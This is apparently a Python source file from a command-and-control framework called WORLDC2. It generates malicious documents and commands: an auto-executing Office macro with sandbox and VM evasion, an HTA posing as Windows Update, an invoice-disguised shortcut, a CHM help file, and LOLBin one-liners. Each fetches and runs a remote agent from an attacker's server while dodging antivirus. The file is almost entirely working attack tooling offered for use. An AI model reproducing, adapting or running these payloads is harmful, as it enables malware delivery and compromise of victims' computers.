#!/usr/bin/env python3
"""
WORLDC2 C2 — Document Injection & LOLBins Generator

Generates payloads that use legitimate applications and Windows binaries
to execute malicious code without triggering AV/EDR.

Document Injection:
- Office macros (VBA) with encrypted payload
- HTA applications
- LNK shortcuts with hidden arguments
- CHM compiled HTML help
- ISO images with autorun

LOLBins (Living-off-the-Land Binaries):
- mshta.exe - Execute HTA remotely
- rundll32.exe - Load malicious DLL
- regsvr32.exe - Execute scriptlet remotely
- certutil.exe - Download + decode payload
- bitsadmin.exe - Persistent download
- wmic.exe - Remote execution
- msiexec.exe - Install malicious MSI
- installutil.exe - Execute .NET assembly
- csc.exe - Compile payload on target

Usage:
    python3 lolbins.py --type macro --server 192.168.1.100:8443
    python3 lolbins.py --type hta --server 192.168.1.100:8443
    python3 lolbins.py --type all --server 192.168.1.100:8443 --output-dir ./payloads/
"""

import argparse
import os
import sys
import base64
import random
import string
import datetime
from pathlib import Path

GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

OUTPUT_DIR = Path("payloads")

def generate_macro(server, name=None):
    """Generate Office VBA macro with encrypted payload."""
    out = OUTPUT_DIR / (name or f"document_{datetime.now():%Y%m%d}.docm")

    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")

    # Encrypted PowerShell download cradle
    ps_command = f"""powershell -w hidden -nop -c "$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX" """

    # Base64 encode for obfuscation
    encoded = base64.b64encode(ps_command.encode()).decode()

    # VBA macro with multiple evasion techniques
    vba = f'''Sub AutoOpen()
    Execute
End Sub

Sub Document_Open()
    Execute
End Sub

Sub Execute()
    On Error Resume Next

    ' Evasion: Check for sandbox
    If Application.UserName = "Administrator" Then Exit Sub
    If Application.ActiveDocument.BuiltInDocumentProperties("Author").Value = "IT" Then Exit Sub

    ' Evasion: Delay execution
    Dim delay As Integer
    delay = 5000
    Dim startTime As Double
    startTime = Timer
    Do While Timer < startTime + delay / 1000
        DoEvents
    Loop

    ' Evasion: Check for VM processes
    Dim objWMIService As Object
    Dim colProcesses As Object
    Dim objProcess As Object
    On Error Resume Next
    Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process")
    For Each objProcess In colProcesses
        If InStr(LCase(objProcess.Name), "vbox") > 0 Then Exit Sub
        If InStr(LCase(objProcess.Name), "vmware") > 0 Then Exit Sub
        If InStr(LCase(objProcess.Name), "sandbox") > 0 Then Exit Sub
    Next

    ' Execute payload via multiple methods
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")

    ' Method 1: PowerShell encoded command
    shell.Run "cmd /c powershell -w hidden -enc {encoded}", 0, False

    ' Method 2: certutil download (fallback)
    ' shell.Run "cmd /c certutil -urlcache -split -f http://{host}:{port}/agent.exe %TEMP%\\update.exe && %TEMP%\\update.exe", 0, False

    ' Method 3: bitsadmin download (fallback)
    ' shell.Run "cmd /c bitsadmin /transfer update /download /priority normal http://{host}:{port}/agent.exe %TEMP%\\update.exe && %TEMP%\\update.exe", 0, False
End Sub
'''

    out.write_text(vba)
    size = out.stat().st_size
    print(f"{GREEN}[✓]{RESET} Macro: {out.name} ({size} B)")
    print(f"  {YELLOW}Execution:{RESET} Open document → Enable macros → Auto-executes")
    print(f"  {YELLOW}Evasion:{RESET} Sandbox check, VM check, delayed execution, encoded command")
    return out

def generate_hta(server, name=None):
    """Generate HTA application."""
    out = OUTPUT_DIR / (name or f"update_{datetime.now():%Y%m%d}.hta")

    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")

    hta = f"""<html>
<head>
<title>Windows Update</title>
<HTA:APPLICATION
    ID="oHTA"
    APPLICATIONNAME="Windows Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    SCROLL="no"
    WINDOWSTATE="minimized"
>
<script language="VBScript">
Sub Window_OnLoad
    ' Hide window
    self.ResizeTo 0, 0
    self.MoveTo -1000, -1000

    ' Execute payload
    Dim shell
    Set shell = CreateObject("WScript.Shell")

    ' Method 1: PowerShell download
    shell.Run "powershell -w hidden -nop -c ""$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX""", 0, False

    ' Method 2: certutil (fallback)
    ' shell.Run "cmd /c certutil -urlcache -split -f http://{host}:{port}/agent.exe %TEMP%\\update.exe && start %TEMP%\\update.exe", 0, False

    ' Close after execution
    setTimeout "self.close", 2000
End Sub
</script>
</head>
<body>
<p style="font-family:Segoe UI;font-size:14px;color:#333;">Please wait while Windows Update configures your system...</p>
</body>
</html>
"""

    out.write_text(hta)
    size = out.stat().st_size
    print(f"{GREEN}[✓]{RESET} HTA: {out.name} ({size} B)")
    print(f"  {YELLOW}Execution:{RESET} Double-click → mshta.exe auto-runs (no console)")
    print(f"  {YELLOW}Evasion:{RESET} Hidden window, looks like Windows Update")
    return out

def generate_lnk(server, name=None):
    """Generate LNK shortcut with hidden PowerShell execution."""
    out = OUTPUT_DIR / (name or f"invoice_{datetime.now():%Y%m%d}.lnk")

    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")

    # PowerShell command with multiple evasion layers
    ps_cmd = f"powershell -w hidden -nop -ep bypass -c \"$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX\""

    # LNK file structure (simplified - full LNK requires binary format)
    # For now, generate a PowerShell script that creates the LNK
    creator = f"""# Create LNK shortcut
$shell = New-Object -ComObject WScript.Shell
$lnk = $shell.CreateShortcut("{out}")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-w hidden -nop -ep bypass -c \\"$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX\\""
$lnk.WindowStyle = 7  # Minimized
$lnk.IconLocation = "C:\\\\Windows\\\\System32\\\\imageres.dll,100"  # Document icon
$lnk.Description = "Invoice Document"
$lnk.Save()
"""

    creator_file = OUTPUT_DIR / "create_lnk.ps1"
    creator_file.write_text(creator)

    print(f"{GREEN}[✓]{RESET} LNK creator: create_lnk.ps1")
    print(f"  {YELLOW}Execution:{RESET} Run create_lnk.ps1 → generates {out.name}")
    print(f"  {YELLOW}Evasion:{RESET} Hidden window, document icon, looks like invoice")
    return out

def generate_chm(server, name=None):
    """Generate CHM with auto-executing JavaScript."""
    out = OUTPUT_DIR / (name or f"help_{datetime.now():%Y%m%d}.chm")

    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")

    # Create HHP project file
    hhp = f"""[OPTIONS]
Auto Index=Yes
Compiled file={out.name}
Contents file=contents.hhc
Default Window=Main
Display compile progress=No
Full-text search=Yes
Title=Windows Help Documentation

[WINDOWS]
Main="Windows Help","contents.hhc","","","main",,,,,0x242020,200,0x1046,[10,10,800,600],0,,,,,0,0

[FILES]
index.html
"""

    # HTML content with auto-executing script
    html = f"""<html>
<head>
<script language="JScript">
function init() {{
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell -w hidden -nop -c \\"$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX\\"", 0, false);
}}
</script>
</head>
<body onload="init()">
<h1>Windows Help Documentation</h1>
<p>Please wait while help content loads...</p>
</body>
</html>
"""

    # Write project files
    hhp_file = OUTPUT_DIR / "project.hhp"
    hhp_file.write_text(hhp)

    html_file = OUTPUT_DIR / "index.html"
    html_file.write_text(html)

    # Create HHK (keyword) file
    hhk = """<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<META NAME="generator" content="Microsoft&reg; HTML Help Workshop 4.0">
</HEAD>
<BODY>
<UL>
<LI><OBJECT type="text/sitemap"><param name="Name" value="Help"><param name="Local" value="index.html"></OBJECT>
</UL>
</BODY>
</HTML>
"""
    hhk_file = OUTPUT_DIR / "contents.hhk"
    hhk_file.write_text(hhk)

    # Create HHC (contents) file
    hhc = """<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<META NAME="generator" content="Microsoft&reg; HTML Help Workshop 4.0">
</HEAD>
<BODY>
<UL>
<LI><OBJECT type="text/sitemap"><param name="Name" value="Help"><param name="Local" value="index.html"></OBJECT>
</UL>
</BODY>
</HTML>
"""
    hhc_file = OUTPUT_DIR / "contents.hhc"
    hhc_file.write_text(hhc)

    print(f"{GREEN}[✓]{RESET} CHM project files created in {OUTPUT_DIR}/")
    print(f"  {YELLOW}Compile:{RESET} hhc.exe project.hhp → {out.name}")
    print(f"  {YELLOW}Execution:{RESET} Double-click CHM → auto-executes on open")
    print(f"  {YELLOW}Evasion:{RESET} Looks like legitimate help file")
    return out

def generate_lolbins(server):
    """Generate all LOLBin execution commands."""
    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")

    payloads = {
        "mshta": f"""# mshta.exe - Execute HTA remotely
mshta.exe http://{host}:{port}/payload.hta""",

        "rundll32": f"""# rundll32.exe - Load malicious DLL
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new ActiveXObject('WScript.Shell').Run('powershell -w hidden -nop -c \\"$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX\\"',0);""",

        "regsvr32": f"""# regsvr32.exe - Execute scriptlet remotely
regsvr32.exe /s /n /u /i:http://{host}:{port}/payload.sct scrobj.dll""",

        "certutil": f"""# certutil.exe - Download + decode payload
certutil.exe -urlcache -split -f http://{host}:{port}/agent.b64 %TEMP%\\agent.exe
certutil.exe -decode %TEMP%\\agent.b64 %TEMP%\\agent.exe
start %TEMP%\\agent.exe""",

        "bitsadmin": f"""# bitsadmin.exe - Persistent download
bitsadmin /transfer update /download /priority normal http://{host}:{port}/agent.exe %TEMP%\\update.exe
start %TEMP%\\update.exe""",

        "wmic": f"""# wmic.exe - Remote execution
wmic.exe process call create "powershell -w hidden -nop -c \\"$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX\\""""",

        "msiexec": f"""# msiexec.exe - Install malicious MSI
msiexec.exe /q /i http://{host}:{port}/payload.msi""",

        "installutil": f"""# installutil.exe - Execute .NET assembly
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U http://{host}:{port}/payload.exe""",

        "csc": f"""# csc.exe - Compile payload on target
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:%TEMP%\\agent.exe %TEMP%\\source.cs
start %TEMP%\\agent.exe""",

        "forfiles": f"""# forfiles.exe - Execute command
forfiles.exe /p C:\\Windows\\System32 /m cmd.exe /c "powershell -w hidden -nop -c \\"$c=New-Object Net.WebClient;$c.DownloadString('http://{host}:{port}/agent.ps1')|IEX\\""""",

        "xwizard": f"""# xwizard.exe - Execute custom wizard
xwizard.exe RunWizard {{00000000-0000-0000-0000-000000000000}}""",

        "control": f"""# control.exe - Load malicious CPL
control.exe http://{host}:{port}/payload.cpl""",
    }

    out_file = OUTPUT_DIR / "lolbins.txt"
    with open(out_file, 'w') as f:
        for name, cmd in payloads.items():
            f.write(f"# === {name.upper()} ===\n")
            f.write(cmd + "\n\n")

    print(f"{GREEN}[✓]{RESET} LOLBins: {out_file.name} ({len(payloads)} techniques)")
    print(f"  {YELLOW}Usage:{RESET} Copy commands to target or use with existing session")
    return out_file

def main():
    parser = argparse.ArgumentParser(description="WORLDC2 Document Injection & LOLBins")
    parser.add_argument("--type", "-t", default="all",
                       choices=["macro", "hta", "lnk", "chm", "lolbins", "all"],
                       help="Payload type")
    parser.add_argument("--server", "-s", required=True, help="C2 server address")
    parser.add_argument("--output-dir", "-o", default="payloads", help="Output directory")
    args = parser.parse_args()

    global OUTPUT_DIR
    OUTPUT_DIR = Path(args.output_dir)
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    print(f"{BOLD}{CYAN}WORLDC2 Document Injection & LOLBins Generator{RESET}")
    print(f"  Server: {args.server}")
    print(f"  Output: {OUTPUT_DIR}\n")

    if args.type in ("macro", "all"):
        generate_macro(args.server)

    if args.type in ("hta", "all"):
        generate_hta(args.server)

    if args.type in ("lnk", "all"):
        generate_lnk(args.server)

    if args.type in ("chm", "all"):
        generate_chm(args.server)

    if args.type in ("lolbins", "all"):
        generate_lolbins(args.server)

    print(f"\n{BOLD}{GREEN}Payloads generated in {OUTPUT_DIR}/!{RESET}")

if __name__ == "__main__":
    main()
